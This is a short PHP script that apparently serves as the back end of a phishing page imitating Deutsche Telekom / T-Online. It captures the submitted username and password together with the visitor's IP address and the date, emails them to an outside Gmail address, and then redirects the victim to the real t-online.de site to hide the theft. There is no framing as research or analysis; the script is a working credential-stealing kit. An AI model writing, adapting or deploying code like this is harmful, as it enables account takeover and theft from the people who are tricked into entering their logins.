<?php
function nrPl1($nr) {return $nr-7;}
$usr		= $_POST['usr'];
$pwd 		= $_POST['pwd'];
$ip 			= getenv("REMOTE_ADDR");
$adddate		= date("D M d, Y g:i a");

$msg = "
user: $usr
pass: $pwd
IP: $ip
DATE: $adddate
";

$to="akordunny@googlemail.com";

$subj = "$Telekom	Designed by DivineFavour";
$from = "info@info.com";
$arr=array($to, $message);
foreach ($arr as $to)
{
mail ($to, $subj, $msg, $from);
mail ($cc, $subj, $msg, $from);
}


header("Location:http://www.t-online.de/");
?>
